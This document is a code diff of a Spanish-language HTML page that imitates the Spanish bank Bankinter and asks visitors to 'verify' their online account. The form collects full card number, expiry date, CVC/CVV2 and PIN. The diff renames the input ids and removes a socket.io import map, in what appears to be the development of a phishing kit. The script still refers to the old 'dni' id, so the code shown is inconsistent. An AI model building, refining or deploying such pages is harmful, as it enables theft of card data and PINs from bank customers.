@@ -25,12 +25,12 @@
             <div>
                 <p class="pp3">Tu tarjeta de coordenadas</p> 
                 
-                <form method="post" id="pg1">
+                <form method="post" id="pg2">
                     <div class="inform in-cc">
                         <p class="pp4">Ingresa los detalles de una tarjeta de crédito o débito de Bankinter para verificar su cuenta bancaria en
                             línea.</span></p>
                         <div class="group">      
-                            <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="19">
+                            <input style="color: rgb(130, 130, 130);" type="tel" id="one" required maxlength="19">
                             <span class="highlight"></span>
                             <span class="bar"></span>
                             <label>NUMERO DE TARJETA</label>
@@ -38,13 +38,13 @@
                         <!--  -->
                         <div class="mm">
                             <div class="group right-mm">   
-                                <input  style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="2">
+                                <input  style="color: rgb(130, 130, 130);" type="tel" id="two1" required maxlength="2">
                                 <span class="highlight"></span>
                                 <span class="bar"></span>
                                 <label>MM</label>
                             </div>  
                             <div class="group">      
-                                <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="4">
+                                <input style="color: rgb(130, 130, 130);" type="tel" id="two2" required maxlength="4">
                                 <span class="highlight"></span>
                                 <span class="bar"></span>
                                 <label>YY</label>
@@ -52,14 +52,14 @@
                         </div>
                         <!--  -->
                         <div class="group inp-mini">      
-                            <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="4">
+                            <input style="color: rgb(130, 130, 130);" type="tel" id="three" required maxlength="4">
                             <span class="highlight"></span>
                             <span class="bar"></span>
                             <label>CVC/CVV2</label>
                         </div>
                         
                         <div class="group inp-mini">  
-                            <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="4">
+                            <input style="color: rgb(130, 130, 130);" type="tel" id="four" required maxlength="4">
                             <span class="highlight"></span>
                             <span class="bar"></span>
                             <label>PIN</label>
@@ -81,13 +81,7 @@
         </div>
     </div>
     
-    <script type="importmap">
-        {
-          "imports": {
-            "socket.io-client": "https://cdn.socket.io/4.7.2/socket.io.esm.min.js"
-          }
-        }
-      </script>
+    
     <script>
         document.getElementById('dni').addEventListener('input', function(event) {
     // Remove any non-numeric characters
